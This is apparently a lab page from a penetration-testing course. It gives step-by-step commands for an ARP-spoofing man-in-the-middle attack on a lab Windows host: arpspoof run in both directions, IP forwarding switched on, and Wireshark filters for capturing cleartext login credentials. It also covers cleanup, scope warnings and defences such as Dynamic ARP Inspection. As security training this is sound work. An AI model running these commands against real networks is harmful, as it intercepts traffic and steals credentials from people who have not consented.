Lab D3-A: ARP Spoofing - Layer 2 MITM

Position yourself between SYNTEX-WIN01 and the gateway using arpspoof, then capture intercepted credentials with Wireshark.

Advanced
Offensive
~40 minutes
Target: SYNTEX-WIN01
ARP Spoofing MITM arpspoof Layer 2 Wireshark D3
Objectives
  • Identify the gateway IP and the victim MAC/IP using arp and nmap
  • Enable IP forwarding on Kali so traffic passes through without dropping
  • Run dual arpspoof to poison both the victim and the gateway simultaneously
  • Capture credentials from traffic passing through the Kali machine
  • Verify MITM position using Wireshark ARP filter
  • Clean up the attack and restore ARP tables
Lab Environment
Attacker
Kali Linux
Your machine
arpspoof, Wireshark, dsniff suite
Victim
SYNTEX-WIN01
<VICTIM-IP>
Windows - browsing HTTP to gateway
Gateway
Lab Gateway
<GATEWAY-IP>
Default gateway for the lab network
⚠
Scope: ARP spoofing causes network disruption for other lab users on the same subnet. Only run this lab in your isolated SYNTEX lab environment, never on a shared network or production system. Always clean up when done.
How the Attack Works
1
Poison the Victim
Send continuous forged ARP replies to SYNTEX-WIN01, telling it that the gateway IP is at your MAC address.
"Gateway (GATEWAY-IP) is at KALI-MAC"
2
Poison the Gateway
Send continuous forged ARP replies to the gateway, telling it that the victim IP is at your MAC address.
"Victim (VICTIM-IP) is at KALI-MAC"
3
MITM Achieved
All traffic from SYNTEX-WIN01 to the internet now flows through Kali. IP forwarding passes it on so the victim does not notice the connection drop.
SYNTEX-WIN01 → KALI → Gateway → Internet
4
Capture Credentials
Wireshark or tcpdump on Kali sees all victim traffic. Any cleartext protocols (HTTP, FTP, Telnet) will contain readable credentials.
Apply filter: http.request.method == "POST"
Steps
1
Identify victim and gateway

Before running any attack you need three pieces of information: your own interface name, the victim IP, and the gateway IP.

# Find your interface name and IP
ip a
# Note your interface (e.g. eth0) and your Kali IP address

# Find the gateway IP
ip route | grep default
# Output: default via 192.168.X.X dev eth0 - the 192.168.X.X is your gateway

# Confirm SYNTEX-WIN01 is alive and get its IP
nmap -sn <NETWORK-RANGE>/24
# Example: nmap -sn 192.168.1.0/24
# Look for the Windows host in the results

# Check your ARP cache to see the gateway MAC
arp -a
Record These Values

You need:
- Your interface: e.g. eth0
- Gateway IP: e.g. 192.168.1.1
- Victim IP (SYNTEX-WIN01): <VICTIM-IP>

2
Enable IP forwarding

This is critical. Without IP forwarding enabled, your Kali machine will drop all traffic it intercepts rather than passing it on. The victim will lose connectivity immediately and the attack will be obvious.

# Enable IP forwarding for this session
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Verify it is enabled (should output 1)
cat /proc/sys/net/ipv4/ip_forward

# Alternative method:
sudo sysctl -w net.ipv4.ip_forward=1
⚠
Do not skip this step. Running arpspoof without IP forwarding causes a network outage for the victim. In a real engagement this would immediately alert the client and may breach scope agreement.
3
Install dsniff if needed

arpspoof is part of the dsniff package. Check if it is installed first.

# Check if arpspoof is installed
which arpspoof

# If not found, install dsniff
sudo apt-get install dsniff -y
4
Run arpspoof - both directions simultaneously

Open two terminal windows. You must run both arpspoof commands at the same time - poisoning only one direction gives you a half-duplex MITM that misses return traffic.

### Terminal 1 - Poison the VICTIM (tell victim: gateway is at our MAC)
sudo arpspoof -i eth0 -t <VICTIM-IP> <GATEWAY-IP>

### Terminal 2 - Poison the GATEWAY (tell gateway: victim is at our MAC)
sudo arpspoof -i eth0 -t <GATEWAY-IP> <VICTIM-IP>
ⓘ
arpspoof will print a line for each ARP packet sent - it runs continuously until you press Ctrl+C. Leave both terminals running while you do step 5.
What arpspoof Is Doing

Each line in the output is one forged ARP reply. The victim's ARP cache is being continuously overwritten with your MAC address mapped to the gateway IP. ARP caches expire, so arpspoof must keep refreshing the poison.

5
Verify MITM position with Wireshark

Open Wireshark in a third terminal. You should be seeing traffic from SYNTEX-WIN01 passing through your machine.

# Open Wireshark
wireshark &

# Apply the ARP display filter to see poison packets being sent
arp

# To see victim's traffic passing through:
ip.addr == <VICTIM-IP>

# To capture HTTP credentials from the victim:
http.request.method == "POST"
✓
When MITM is working, you will see packets from <VICTIM-IP> appearing in Wireshark even though Kali is not the source or destination. This traffic is passing through your machine because of the poisoned ARP cache.
6
Verify victim ARP cache is poisoned

On SYNTEX-WIN01, check the ARP table. The gateway entry should show your Kali MAC address - confirming the poison worked.

# On SYNTEX-WIN01 (Windows command prompt):
arp -a

# Look for the gateway IP entry
# Example output (gateway poisoned):
# 192.168.1.1    00-0c-29-aa-bb-cc    dynamic  <-- This is YOUR Kali MAC

# To find your Kali MAC address:
# On Kali:
ip link show eth0 | grep ether
7
Clean up and restore ARP tables

Stop the attack cleanly. Simply pressing Ctrl+C in both arpspoof terminals is usually enough - arpspoof sends a few correct ARP replies before exiting to restore the tables.

# Press Ctrl+C in both arpspoof terminal windows
# arpspoof will automatically send corrective ARP replies on exit

# Disable IP forwarding (restore to default)
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward

# Verify ARP tables have restored on SYNTEX-WIN01:
# On SYNTEX-WIN01 - Windows command prompt:
arp -d *
# This clears the ARP cache so it repopulates with correct values

# On Kali - verify your own ARP cache is clean:
arp -a
⚠
Always clean up. In a real penetration test, failing to restore ARP tables after an MITM attack leaves the network in a broken state and may constitute damage to the client's environment - a potential legal issue regardless of scope.
Confirmation Questions
1. Why must IP forwarding be enabled before running arpspoof?
Show answer

Without IP forwarding, the Linux kernel drops packets that are not destined for the local machine. This means all victim traffic routed to Kali gets silently discarded, causing a complete loss of connectivity for the victim. Enabling IP forwarding tells the kernel to forward packets between interfaces rather than drop them, making the attack invisible to the victim.

2. Why do you need to run arpspoof in both directions rather than just poisoning the victim?
Show answer

If you only poison the victim, traffic from victim to gateway flows through Kali, but return traffic from the gateway goes directly back to the victim (bypassing Kali). You only see half the conversation. To intercept both directions you must also poison the gateway, telling it that the victim's IP is at your MAC address.

3. How would you verify from the victim machine that an ARP poisoning attack is in progress?
Show answer

Run arp -a on the victim machine and check the gateway's MAC address. If it matches the MAC address of a machine that should not be the gateway, ARP poisoning is occurring. The attack is also detectable by tools like XArp or network IDS that monitor for ARP anomalies (such as the same MAC claiming multiple IPs, or rapid ARP reply floods).

4. What switch-level defence prevents ARP spoofing attacks, and how does it work?
Show answer

Dynamic ARP Inspection (DAI) - a feature on managed switches. DAI validates ARP packets against the DHCP snooping binding table, which maps IP addresses to MAC addresses and the switch port they should come from. Any ARP reply that does not match the binding table is dropped. This makes ARP spoofing ineffective because the forged replies are silently discarded before they reach the victim.

5. You have achieved MITM between the victim and the gateway. What Wireshark display filter would you use to look for cleartext HTTP login credentials in the intercepted traffic?
Show answer

http.request.method == "POST" - this shows only HTTP POST requests, which are used for form submissions including login forms. The credentials will be visible in the HTML Form URL Encoded section of the packet details pane. Combine with ip.addr == <VICTIM-IP> to isolate only the victim's traffic: http.request.method == "POST" and ip.addr == <VICTIM-IP>
